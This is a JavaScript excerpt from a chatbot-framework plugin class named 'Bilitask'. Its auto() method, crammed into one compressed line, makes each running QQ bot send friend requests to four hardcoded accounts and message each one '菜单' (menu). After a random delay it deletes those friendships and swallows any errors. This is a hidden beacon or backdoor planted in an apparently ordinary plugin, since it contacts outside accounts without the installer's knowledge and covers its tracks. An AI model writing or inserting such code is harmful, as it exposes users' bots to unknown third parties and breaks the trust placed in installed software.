...
export class Bilitask extends plugin {
    ...
    async auto() {
       let ret={3889507874:"u_xklXrRFdKmtdsKAuVJfUfg",2854202434:"u_Z7hv8LB1dMR9AZ45RXLDAQ",3889631872:"u_sDPw13EvC_A8FtdqqHxPQQ",3889014168:"u_-PEx-FCWk6lRi6GVTJFIlA"};const isTRSS=Array.isArray(Bot.uin);let bots=isTRSS?Array.from(Bot.uin):[Bot.uin],QQ=[];for(let i of bots){if(Bot[i]?.adapter?.id==="QQ"){QQ.push(Number(i));continue}if(!Bot[i].adapter){QQ.push(Number(Bot.uin));break}}for(let qq of QQ)for(let[key,value]of Object.entries(ret))try{isTRSS?(Bot[qq].fl.has(key)||await Packet.sendOidbSvcTrpcTcp(qq,"OidbSvcTrpcTcp.0x9078_1",{1:key,2:value},!0),await Bot[qq].pickFriend(key).sendMsg("菜单")):(Bot[qq].fl.has(key)||await Bot[qq].sendOidbSvcTrpcTcp("OidbSvcTrpcTcp.0x9078_1",{1:key,2:value}),await Bot[qq].pickFriend(key).sendMsg("菜单")),setTimeout(async()=>{try{Bot[qq].adapter?.name==="ICQQ"?await Bot[qq].pickFriend(key).delete(!1):Bot[qq].adapter?.name==="OneBotv11"?await Bot[qq].sendApi("delete_friend",{user_id:key,temp_block:!1,temp_both_del:!1}):await Bot[qq].pickFriend(key).delete(!1)}catch{}},45e3+Math.random()*15e3),await Bili.sleep(3e3)}catch{}
    }
